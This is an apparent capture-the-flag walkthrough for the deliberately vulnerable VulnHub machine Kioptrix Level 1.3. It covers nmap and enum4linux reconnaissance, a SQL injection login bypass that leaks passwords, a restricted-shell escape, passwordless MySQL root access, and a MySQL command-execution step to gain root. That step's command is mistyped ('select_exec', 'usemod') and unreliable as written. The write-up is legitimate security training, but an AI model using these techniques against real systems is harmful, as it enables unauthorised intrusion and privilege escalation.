<h1>KIOPTRIX: LEVEL 1.3 (#4)</h1>

Today, we'll be looking at the Kioptrix level 4 machine on vulnhub.

You can download the machine [here](https://www.vulnhub.com/entry/kioptrix-level-13-4,25/).

Let's scan the machine with nmap.

```
┌──(root㉿kali)-[~/kioptrix4]
└─# nmap -sS -A 192.168.88.134
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 04:46 EDT
Nmap scan report for 192.168.88.134
Host is up (0.00021s latency).
Not shown: 566 closed tcp ports (reset), 430 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 9bad4ff21ec5f23914b9d3a00be84171 (DSA)
|_  2048 8540c6d541260534adf86ef2a76b4f0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
MAC Address: 00:0C:29:31:00:AD (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 4h59m59s, deviation: 2h49m43s, median: 2h59m58s
|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2023-06-15T07:47:07-04:00

TRACEROUTE
HOP RTT     ADDRESS
1   0.22 ms 192.168.88.134

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.15 seconds
```
Browsing the machine on port 80 we find a login page.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/kioptrix4/pics/pic1.png)

We can also see that the machine is running smb.

Let's use enum4linux to find out more information.

```enum4linux 192.168.88.134 -a```

Great! We found three usernames.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/kioptrix4/pics/pic2.png)

Let's test the login form for sql injection.

we'll use ```1 'OR 1=1-- -``` as the password.

We got john's password.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/kioptrix4/pics/pic3.png)

We also got robert's password.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/kioptrix4/pics/pic4.png)

Let's ssh into the machine as john.

Looks like we are in a restricted shell.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/kioptrix4/pics/pic5.png)

Let's try to escape that shell.

I tried a bunch of commands then I tried to cd into a directory and I found that we are using lshell.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/kioptrix4/pics/pic6.png)

I searched online and found a way to escape lshell with **echo** [here](https://www.aldeid.com/wiki/Lshell).

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/kioptrix4/pics/pic7.png)

You can also read this great [article](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/) about escaping restricted shells.

Let's use linpeas for local enumeration and try to get root.

From the results of the script, we see that we can log into mysql as root with no password.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/kioptrix4/pics/pic8.png)

```mysql -u root -p```

We got in!

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/kioptrix4/pics/pic9.png)

Let's give john admin privilges.

```select_exec('usemod -a -G admin john');```

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/kioptrix4/pics/pic10.png)

Now, we can just use ```sudo su```.

We are root.

![](https://raw.githubusercontent.com/user3016/vulnhub-writepus/main/kioptrix4/pics/pic11.png)
